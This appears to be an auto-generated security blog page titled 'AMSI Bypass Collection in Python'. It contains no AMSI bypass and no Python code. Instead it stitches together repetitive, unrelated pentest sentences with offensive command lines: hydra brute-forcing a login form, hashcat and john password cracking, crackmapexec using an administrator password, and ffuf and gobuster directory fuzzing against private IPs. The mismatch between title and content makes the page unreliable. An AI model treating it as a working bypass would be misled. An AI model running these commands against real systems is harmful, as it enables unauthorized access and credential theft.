---
TitleSEO: "AMSI Bypass Collection in Python | ZureFX"
TitlePost: "AMSI Bypass Collection — Python"
Author: "ZureFX"
Description: "A Python script for amsi bypass collection. Built for security research and automation."
Keywords: "go, bash, powershell, python"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-495.html"
URL_IMAGES: ""
Date: "2025-05-08"
Tags: "Go, Bash, PowerShell, Python"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-495"
Permalink: "/scripting/script-amsi-bypass-collection-495.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `msfvenom`
- `socat`
- `bloodhound`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.125.39.172 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.51.65/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

```python
crackmapexec smb 10.114.122.250 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.57.96/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.216.245/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.86.140.72/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.80.148.24/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 21.27s
```
